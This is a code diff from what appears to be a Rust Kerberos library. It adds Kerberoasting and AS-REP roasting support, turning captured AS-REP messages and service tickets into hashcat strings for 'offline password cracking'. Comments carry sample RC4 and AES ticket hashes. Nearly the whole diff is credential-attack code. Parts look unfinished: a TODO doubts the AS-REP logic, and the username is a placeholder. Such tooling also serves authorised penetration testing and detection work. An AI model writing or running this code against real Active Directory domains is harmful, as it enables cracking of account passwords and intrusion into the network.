@@ -1,11 +1,11 @@
-use rasn_kerberos::{AsRep, AsReq, TgsRep};
+use rasn_kerberos::{AsRep, AsReq, TgsRep, Ticket};
 
-use crate::structures::AsReqExt;
+use crate::{
+    constants::{ETYPE_AES128_CTS_HMAC_SHA1_96, ETYPE_AES256_CTS_HMAC_SHA1_96, ETYPE_RC4_HMAC_MD5},
+    structures::{AsRepExt, AsReqExt, TicketExt},
+};
 
 pub struct HashcatHash {
-    // mode: u32,
-    // short_name: String,
-    // name: String,
     output: String,
 }
 
@@ -24,6 +24,7 @@ pub enum RoastError {
 }
 
 pub trait Roastable {
+    /// Generate a hashcat-compatible artifact for offline password cracking
     fn dump_to_hashcat(&self) -> Result<HashcatHash, RoastError>;
 }
 
@@ -83,13 +84,78 @@ impl Roastable for AsReq {
 
 impl Roastable for AsRep {
     fn dump_to_hashcat(&self) -> Result<HashcatHash, RoastError> {
-        todo!()
+        // TODO: This is wrong... ticket is encrypted with krbtgt key right?
+        //let user = self.get_cname();
+        //ticket_to_hashcat(&self.0.ticket, "test1")
+
+        let user = self.get_cname();
+        let realm = self.get_crealm();
+        // let enc_part: EncAsRepPart =
+        //     rasn::der::decode(&self.0.enc_part.cipher).map_err(|_| RoastError::InvalidData)?;
+        match self.0.enc_part.etype {
+            ETYPE_RC4_HMAC_MD5 => {
+                let checksum = &self.0.enc_part.cipher.slice(..16);
+                let ciphertext = &self.0.enc_part.cipher.slice(16..);
+                Ok(HashcatHash {
+                    output: format!("$krb5asrep$23${user}@{realm}:{checksum:x}${ciphertext:x}"),
+                })
+            }
+            _ => Err(RoastError::UnsupportedEtype),
+        }
     }
 }
 
 impl Roastable for TgsRep {
     fn dump_to_hashcat(&self) -> Result<HashcatHash, RoastError> {
-        todo!()
+        ticket_to_hashcat(&self.0.ticket, "USERNAME")
+    }
+}
+
+impl Roastable for Ticket {
+    fn dump_to_hashcat(&self) -> Result<HashcatHash, RoastError> {
+        ticket_to_hashcat(&self, "USERNAME")
+    }
+}
+
+fn ticket_to_hashcat(ticket: &Ticket, user: &str) -> Result<HashcatHash, RoastError> {
+    // RC4 (mode 13100):
+    // $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe42230300d56852c9eb$891ad31d09ab89c6b3b8c5e5de6c06a7f49fd559d7a9a3c32576c8fedf705376cea582ab5938f7fc8bc741acf05c5990741b36ef4311fe3562a41b70a4ec6ecba849905f2385bb3799d92499909658c7287c49160276bca0006c350b0db4fd387adc27c01e9e9ad0c20ed53a7e6356dee2452e35eca2a6a1d1432796fc5c19d068978df74d3d0baf35c77de12456bf1144b6a750d11f55805f5a16ece2975246e2d026dce997fba34ac8757312e9e4e6272de35e20d52fb668c5ed
+    // AES128 (mode 19600):
+    // $krb5tgs$17$user$realm$ae8434177efd09be5bc2eff8$90b4ce5b266821adc26c64f71958a475cf9348fce65096190be04f8430c4e0d554c86dd7ad29c275f9e8f15d2dab4565a3d6e21e449dc2f88e52ea0402c7170ba74f4af037c5d7f8db6d53018a564ab590fc23aa1134788bcc4a55f69ec13c0a083291a96b41bffb978f5a160b7edc828382d11aacd89b5a1bfa710b0e591b190bff9062eace4d26187777db358e70efd26df9c9312dbeef20b1ee0d823d4e71b8f1d00d91ea017459c27c32dc20e451ea6278be63cdd512ce656357c942b95438228e
+    // AES256 (mode 19700):
+    // $krb5tgs$18$user$realm$8efd91bb01cc69dd07e46009$7352410d6aafd72c64972a66058b02aa1c28ac580ba41137d5a170467f06f17faf5dfb3f95ecf4fad74821fdc7e63a3195573f45f962f86942cb24255e544ad8d05178d560f683a3f59ce94e82c8e724a3af0160be549b472dd83e6b80733ad349973885e9082617294c6cbbea92349671883eaf068d7f5dcfc0405d97fda27435082b82b24f3be27f06c19354bf32066933312c770424eb6143674756243c1bde78ee3294792dcc49008a1b54f32ec5d5695f899946d42a67ce2fb1c227cb1d2004c0
+    match ticket.enc_part.etype {
+        ETYPE_RC4_HMAC_MD5 => {
+            let realm = ticket.realm.as_str();
+            let spn = ticket.get_spn();
+            let checksum = ticket.enc_part.cipher.slice(..16);
+            let confounder = ticket.enc_part.cipher.slice(16..24);
+            let ciphertext = ticket.enc_part.cipher.slice(24..);
+            Ok(HashcatHash {
+                output: format!(
+                    "$krb5tgs$23$*{user}${realm}${spn}*${checksum:x}${confounder:x}{ciphertext:x}"
+                ),
+            })
+        }
+        ETYPE_AES128_CTS_HMAC_SHA1_96 => {
+            let realm = ticket.realm.as_str();
+            let len = ticket.enc_part.cipher.len();
+            let checksum = ticket.enc_part.cipher.slice(len - 12..);
+            let etype2 = ticket.enc_part.cipher.slice(..len - 12);
+            Ok(HashcatHash {
+                output: format!("$krb5tgs$17${user}${realm}${checksum:x}${etype2:x}"),
+            })
+        }
+        ETYPE_AES256_CTS_HMAC_SHA1_96 => {
+            let realm = ticket.realm.as_str();
+            let len = ticket.enc_part.cipher.len();
+            let checksum = ticket.enc_part.cipher.slice(len - 12..);
+            let etype2 = ticket.enc_part.cipher.slice(..len - 12);
+            Ok(HashcatHash {
+                output: format!("$krb5tgs$18${user}${realm}${checksum:x}${etype2:x}"),
+            })
+        }
+        _ => Err(RoastError::UnsupportedEtype),
     }
 }
 
